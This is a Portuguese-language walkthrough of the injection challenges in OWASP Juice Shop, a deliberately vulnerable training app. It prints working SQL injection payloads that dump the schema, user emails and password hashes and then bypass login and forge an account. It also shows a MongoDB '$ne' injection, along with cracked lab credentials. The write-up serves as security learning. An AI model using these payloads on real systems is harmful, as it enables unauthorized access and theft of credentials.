+++
title = 'Injection'
date = 2024-01-14T07:07:07+01:00
draft = true
+++

# Injection

Utilizando do sistema e analisando como posso interagir com ele, comecei interagindo com uma funcionalidade de busca.

Ao carregar a página principal, o client faz uma request para `/rest/products/search?q=`, que traz um JSON de todos os produtos:

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro `?q` na consulta para o backend, aqui nos surge algumas possibilidades:

* Testar o front-end para XSS, visto que controlamos o texto HTML renderizado na tela;
* Testar o back-end para um possível SQL Injection, pois uma funcionalidade que retorna uma lista de itens muito provavelmente está lendo os itens de uma base de dados SQL, e o parâmetro `q` é um input que controlamos que possivelmente é utilizado na query, nos dando controle sobre a query SQL;

### SQL Injection inicial

Ainda temos o endoint `/rest/products/search?q=` para testar, e começar a manipular esse input `?q`. Fazendo uma busca por "Apple", me retorna apenas os itens com Apple no nome no JSON:

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Provavelmente, esse input que controlamos é usado em uma query sql, podemos manipular então manipular essa query. Fazendo essa request `GET /rest/products/search?q=xxdd%27%20or%20apple`, temos uma exception na tela que nos mostra a query utilizada, nos ajudando a craftar uma payload melhor para esse ataque:

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

Com isso, podemos ver que a query utilizada é:

```sql
SELECT * FROM Products WHERE ((name LIKE '%$INPUT%' OR description LIKE '%$INPUT%') AND deletedAt IS NULL) ORDER BY name
```

e que input é utilizado diretamente na URL, então de fatos temos controle sobre a query.

\
usando order by consegui identificar que existem 9 colunas na tabela, e com union all select: `aaaaa%' )) UNION ALL SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9 -- -` <br>

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

```json
{
		"id": 1,
		"name": 2,
		"description": 3,
		"price": 4,
		"deluxePrice": 5,
		"image": 6,
		"createdAt": 7,
		"updatedAt": 8,
		"deletedAt": 9
}
```

Irei colocar a sequencia de payloads utilizadas e os outputs obtidos:

`aaaaa' )) UNION ALL SELECT 1, sqlite_version() as version, 3, 4, 5, 6, 7, 8, 9 -- -`

version: 3.44.2

\
`aaaaa%' )) UNION ALL SELECT sql , 2, 3, 4, 5, 6, 7, 8, 9 from sqlite_master -- -`&#x20;



input: `aaaaa%' )) UNION ALL SELECT group_concat(tbl_name) , 2, 3, 4, 5, 6, 7, 8, 9 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -`

output:

```json
{
	"status": "success",
	"data": [{
		"id": "Users,Addresses,Baskets,Products,BasketItems,Captchas,Cards,Challenges,Complaints,Deliveries,Feedbacks,ImageCaptchas,Memories,PrivacyRequests,Quantities,Recycles,SecurityQuestions,SecurityAnswers,Wallets",
		"name": 2,
		"description": 3,
		"price": 4,
		"deluxePrice": 5,
		"image": 6,
		"createdAt": 7,
		"updatedAt": 8,
		"deletedAt": 9
	}]
}
```

input: `aaaaa%' )) UNION ALL SELECT sql , 2, 3, 4, 5, 6, 7, 8, 9 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='Users' -- -`

output:

```json
{
	"status": "success",
	"data": [{
		"id": "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)",
		"name": 2,
		"description": 3,
		"price": 4,
		"deluxePrice": 5,
		"image": 6,
		"createdAt": 7,
		"updatedAt": 8,
		"deletedAt": 9
	}]
}
```

input: `aaaaa%' )) UNION ALL SELECT id , username, email, password, role, deluxeToken, totpSecret, 8, 9 FROM Users -- -` output:

```json
{
	"status": "success",
	"data": [{
		"id": 1,
		"name": "",
		"description": "admin@juice-sh.op",
		"price": "0192023a7bbd73250516f069df18b500",
		"deluxePrice": "admin",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 2,
		"name": "",
		"description": "jim@juice-sh.op",
		"price": "e541ca7ecf72b8d1286474fc613e5e45",
		"deluxePrice": "customer",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 3,
		"name": "",
		"description": "bender@juice-sh.op",
		"price": "0c36e517e3fa95aabf1bbffc6744a4ef",
		"deluxePrice": "customer",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 4,
		"name": "bkimminich",
		"description": "bjoern.kimminich@gmail.com",
		"price": "6edd9d726cbdc873c539e41ae8757b8c",
		"deluxePrice": "admin",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 5,
		"name": "",
		"description": "ciso@juice-sh.op",
		"price": "861917d5fa5f1172f931dc700d81a8fb",
		"deluxePrice": "deluxe",
		"image": "d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 6,
		"name": "",
		"description": "support@juice-sh.op",
		"price": "3869433d74e3d0c86fd25562f836bc82",
		"deluxePrice": "admin",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 7,
		"name": "",
		"description": "morty@juice-sh.op",
		"price": "f2f933d0bb0ba057bc8e33b8ebd6d9e8",
		"deluxePrice": "customer",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, {
		"id": 8,
		"name": "",
		"description": "mc.safesearch@juice-sh.op",
		"price": "b03f4b0ba8b458fa0acdc02cdb953bc8",
		"deluxePrice": "customer",
		"image": "",
		"createdAt": "",
		"updatedAt": 8,
		"deletedAt": 9
	}, 
	...
	]
}
```

### Logando como administrador | Crack Hash

Com isso, um dos desafios e logar como administrador do sistema, podemos tentar quebrar a Hash da senha dele (usando Hashcat ou similar) e tentar logar, vamos tentar primeiro no Crackstation:

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Então podemos logar com admin@juice-sh.op:admin124

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

### Logando como Jim

Logamos como admin e concluímos mais um desafio. Agora, o próximo é logar como jim, e o processo é o mesmo, quebramos a hash de sua senha, e ai temos as credenciais jim@juice-sh.op:ncc-1701&#x20;

### Logando como Bender | Auth bypass

O próximo relacionado ao login, é logar como bender, porém dessa vez, a hash dele não é crackeavel, vamos então analisar a interação entre o client e o server para executar o login de uma conta

Podemos ver que é bem simples, mandamos as credenciais de login e senha, e ele nos devolve um token JWT e alguns meta-dados

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

Testando esses inputs, facilmente conseguimos triggar outra exception que nos revela mais um sql injection

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

Podemos criar então outra payload de SQL Injection para bypassar esse mecanismo de login, colocando um breaking point nesse endpoint, assim que meu client enviar a request, a proxy irá interceptar para que eu altere antes de enviar para o server, com isso posso injetar a payload \`bender@juice-sh.op' -- - \` para controlar a query fazendo com que, assim que ela pegue os dados do email inserido, o resto seja comentado e não tenha verificação pela senha, e assim o server irá concluir a autenticação com os dados do Bender:

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Executando a request:

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

Estou agora logado como Bender, e mais um desafio foi concluído.

## Ephemeral Accountant

Esse desafio nos pede para logar com uma conta com email "acc0unt4nt@juice-sh.op", mas sem registrar ela.

Minha primeira ideia foi aproveitar o controle do banco de dados pelo SQL Injection e fazer com que a query seja algo como "select \* from Users where email = 'acc0unt4nt@juice-sh.op' -- - para não fazer nenhuma verificação, porém com isso, nenhum dado seria retornado e daria erro na aplicação por não ter dados, então imediatamente fui pensar em outra ideia.

Usando union select, posso fazer uma tabela virtual que preencha os campos da tabela User com dados controlados por mim, e como já temos o schema da tabela, podemos saber quais campos preencher, então a payload fica sendo essa:

```sql
'union select 1337 as 'id', 'account' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '1337' as 'password', 'customer' as 'role', 'token1222' as 'deluxeToken', '0.0.0.0' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', DATE('now') as 'createdAt', DATE('now') as 'updateAt',NULL as 'deletedAt' -- -`
```

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Temos o seguinte erro: `SQLITE_CONSTRAINT: FOREIGN KEY constraint failed`

Parece que em alguma parte do processo o Id é usado para recuperar a tabela Basket do usuário, então preciso de um ID válido para o join ser feito no corretamente com os dados dessa conta, vou usar o ID de uma conta existente, como 8:

```sql
' union select 8 as 'id', 'account' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '1337' as 'password', 'customer' as 'role', 'token1222' as 'deluxeToken', '0.0.0.0' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', DATE('now') as 'createdAt', DATE('now') as 'updateAt',NULL as 'deletedAt' -- -
```

e deu certo:

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Com isso, posso fazer um breakingpoint na hora do login, e passar essa request que cria uma conta virtualmente na base de dados:

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Com isso logamos com a conta inexistente e fechando os desafios da parte de autenticação, podemos começar a explorar melhor agora a área logada do sistema e ver as novas interações que temos dessa forma.



## Christmas special

Um desafio da plataforma é comprar um produto que não está mais disponível, para isso, precisamos primeiro tentar achar o produto que não está disponível, e temos um endpoint que lista produtos que é vulnerável a SQL Injection, podemos fazer essa chamada: `GET /rest/products/search?q=%25%27%20or%201%3D1%29%29%20--%20- HTTP/1.1`, onde  a payload na query string \`q\` é `%' or 1=1)) -- -`, essa payload fecha o a consulta "like" e lista todos os produtos se 1 for igual 1.

Na resposta, podemos ver que temos um registro com `deletedAt` diferente de null, então é o produto deletado que devemos comprar:

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

Agora, vou ver como é a interação do client com o server para adicionar um produto ao carrinho:

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

Basicamente enviamos o ID do produto, o ID do carrinho e a quantidade. Como controlamos o produto e o carrinho, e sabendo que o ID do produto do desafio é 10, podemos apenas tentar adicionar ao carrinho o produto de ID 10 (e futuramente, tentar adicionar um produto em um carrinho que não seja nosso, mas fica para outro post). Usando minha proxy, fiz uma request trocando o ID do produto para 10, e funcionou, ele adicionou o produto deletado em meu carrinho:

<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Agora, vou excluir o Apple Juice que adicionei apenas para para entender como funciona o processo de adicionar item ao carrinho, e finalizar a compra com do Christmas Super-Surprise-Box (2014 Edition) Precisamos adicionar o endereço:

<figure><img src="../../.gitbook/assets/Pasted image 20240512211123.png" alt=""><figcaption></figcaption></figure>

Escolher um tipo de entrega:

<figure><img src="../../.gitbook/assets/Pasted image 20240512211200.png" alt=""><figcaption></figcaption></figure>

Adicionar um cartão e continuar a compra:

<figure><img src="../../.gitbook/assets/Pasted image 20240512211239.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20240512211325.png" alt=""><figcaption></figcaption></figure>

E finalmente, efetuar a compra:

<figure><img src="../../.gitbook/assets/Pasted image 20240512211346.png" alt=""><figcaption></figcaption></figure>

E com isso, foi concluído o desafio de comprar um produto já deletado, através de SQL Injection (e da falta de validação do back-end, que deveria verificar se o produto está disponível antes de adicionar ao carrinho, mas não o fez).



## NoSQL Manipulation&#x20;

Quando estamos autenticado, podemos deixar uma avaliação em um produto, usando uma proxy, podemos ver a interação entre o client e o server:

<figure><img src="../../.gitbook/assets/Pasted image 20240509170453.png" alt=""><figcaption></figcaption></figure>

E na hora de ler as avaliações, podemos ver também com qual endpoint o client interage, e nele podemos ver que se trata de um schema de mongodb (caso não saiba o motivo, o campo \_\_ id normalmente pertence ao mongodb):

<figure><img src="../../.gitbook/assets/Pasted image 20240509170800.png" alt=""><figcaption></figcaption></figure>

Analisando o endpoint usado para criar o comentário, podemos tirar algumas hipóteses pela request:

```http
	PUT /rest/products/24/reviews HTTP/1.1
	...
	{"message":"review teste", "author":"acc0unt4nt@juice-sh.op"}
```

Podemos notar que controlamos o ID do produto, a mensagem e o autor. Se tratando de um pentest black-box, não sabemos como está estruturado o código no servidor, mas podemos imaginar um pseudo-código parecido com isso:

```javascript
@route.put("/rest/products/{product_id}/reviews")
function create_review(req: Request, product_id: int)
{
	var {message, author} = rrq.json()

	var db = db.client("products");
	var collection = db.collection("reviews");

	var result = await collection.update(
		{ product: product_id }, 
		{ $set:  {message: review } } 
	);
	
	...
	...
}

```

ao invés de buscar o produto pelo ID, podemos tentar usar um query operator no nosso input para fazer o mongodb criar esse comentário em todos os produtos (https://www.mongodb.com/docs/manual/reference/operator/query/).

Tentando injetar query operator na URL:

<figure><img src="../../.gitbook/assets/Pasted image 20240509171009.png" alt=""><figcaption></figcaption></figure>

Porém não funcionou, tentei a mesma ideia de outras formas e também não obtive resultado, então é provável que o servidor apenas crie um novo registro no mongodb, com um campo `product_id` que vem da URL, independe se o produto existe ou não, e então não buscar por um produto existente primeiro.

Função de editar review:\
Continuando a análise, ainda na parte de avaliação temos uma funcionalidade para editar uma avaliação, e com a proxy podemos ver como o client interage com o endpoint de edição:

<figure><img src="../../.gitbook/assets/Pasted image 20240509171045.png" alt=""><figcaption></figcaption></figure>

Com essa request, podemos notar que um dos inputs de o ID do documento editado:

<figure><img src="../../.gitbook/assets/Pasted image 20240509171138.png" alt=""><figcaption></figcaption></figure>

Depois de buscar no google por exemplos de update usando mongodb, podemos imaginar um pseudo-código parecido com isso para editar uma review:

```js
@route.patch("rest/products/review")
function update_review(req: Request) 
{
	var {comment_id, review} = req.body; //attacker-controlled input 
	
	var db = db.client("products");
	var collection = db.collection("reviews");
	
		var result = await collection.x(
		{ comment: comment_id }, //filtro -> posso controlar o filtro pelo input
		{ $set:  {message: review } } //atributos atualizados
	);
	
	...
	...
}
```

Onde dessa vez, tempos mais certeza de que o servidor primeiro busca por uma review específica (e controlamos o input que está sendo usado para essa busca com parâmetro ID) para depois editar seu conteúdo.\
A ideia então é tentar usar outro query operator já que temos maiores certezas de um filtro sendo utilizado, então, ao invés do servidor buscar por uma review especifica, ele vai fazer uma query que pode trazer diversos reviews.\
Ataque:

<figure><img src="../../.gitbook/assets/Pasted image 20240509171356.png" alt=""><figcaption></figcaption></figure>

Com essa request, o servidor no momento de buscar um produto pelo ID, vai fazer uma query `"$ne": null`, que buscar por todos os produtos onde o ID é diferente de null (ne = not equal. https://www.mongodb.com/docs/manual/reference/operator/query/ne/ ). Então irá nos trazer todas as reviews, e depois editar com o nosso comentário.\
Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20240509171435.png" alt=""><figcaption></figcaption></figure>

Podemos ver mais abaixo na response os diversos itens com o valor que editamos:

<figure><img src="../../.gitbook/assets/Pasted image 20240518165600.png" alt=""><figcaption></figcaption></figure>

Editamos todas as reviews de produtos salvas no banco e fechamos mais um desafio.

Com esse, concluímos todos os desafios do módulo de injection (disponíveis em docker):

<figure><img src="../../.gitbook/assets/Pasted image 20240512212917.png" alt=""><figcaption></figcaption></figure>
